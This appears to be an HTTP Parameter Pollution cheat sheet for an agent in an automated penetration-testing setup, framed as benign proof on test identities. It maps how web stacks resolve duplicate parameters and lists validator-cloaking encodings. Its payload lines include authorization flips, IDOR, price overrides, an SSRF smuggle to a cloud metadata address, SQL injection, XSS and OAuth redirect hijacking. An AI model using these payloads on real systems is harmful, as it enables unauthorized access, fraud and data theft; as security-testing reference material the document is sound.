# HTTP Parameter Pollution (HPP) techniques
# Benign: flip a decision on TEST identities. When HPP smuggles another payload, hand off to that agent.

## Parser precedence — who wins when a parameter repeats (fingerprint first)
| Stack | Duplicate `p=a&p=b` resolves to |
|---|---|
| ASP.NET / IIS | first (a) — actually comma-joins: `a,b` |
| PHP / Apache | last (b) |
| JSP / Tomcat / Servlet | first (a) |
| Python / Flask | first, but `getlist` sees both |
| Node Express (`querystring`) | first; (`qs`) arrays/last-wins |
| Spring MVC | binds both to a list |
| Perl CGI | comma-concatenated `a,b` |
| JSON duplicate keys | usually last-wins; some gateways reject |
A **discrepancy between the front layer (gateway/WAF/validator) and the backend** is the vulnerability:
the inspected value is benign, the acted-on value is malicious.

## Inject across every source
```
?p=v1&p=v2                              # URL query
(body)  p=v1&p=v2                        # form POST
?p=v1  + body p=v2                       # hybrid (URL vs body precedence)
{"p":"a","p":"b"}                        # JSON duplicate keys
Cookie: role=user; role=admin           # duplicate cookie
X-Forwarded-For: 1.2.3.4, 127.0.0.1     # duplicate/CSV header
p[]=a&p[]=b   p[0]=a&p[1]=b   p=x&p[]=y  # array notation + mixed
```

## Parameter cloaking (defeat a validator that keys on the literal name)
```
par%61m=   (param)      PARAM=   (case)      par%2561m=   (double-encode)
param%00=              Greek/Unicode lookalike for a letter
```

## Exploit patterns (benign proof on test identities)
```
access=false&access=true          admin=false&admin=true         # authorization flip
user=victim&user=admin            id=attacker&id=victim          # identity / IDOR
amount=1&amount=1000   price=0&price=... to=victim&to=attacker   # value override (approval for real change)
url=https://ok&url=http://169.254.169.254/   -> hand to ssrf-*   # SSRF smuggle
category=1&category=1 OR 1=1       -> hand to sqli-*             # filter/WAF bypass smuggle
q=safe&q=<script>...   -> hand to xss-*                          # WAF bypass smuggle
redirect_uri=ok&redirect_uri=attacker   -> hand to oauth         # OAuth redirect dup
Transfer-Encoding dup / Content-Length dup   -> hand to request-smuggling
```

## GraphQL / WebSocket angle
```
# GraphQL duplicate variable or alias flooding (rate-limit / auth bypass):
query ($id:Int!, $id:Int!) {...}        a: user(id:1) b: user(id:2) ... (alias flood)
# WebSocket upgrade URL dup: ?token=a&token=b&room=1&room=admin ; dup keys in JSON frames
```

## Confirm + tools
Compare which value the response reflects/acts on across layers; verify the authz/value change on test
identities. Param Miner (hidden params), Burp Repeater/Intruder. Pure override via duplication = an HPP
finding; a smuggled payload = the delivered bug (confirmed by that agent), HPP noted as the vector.
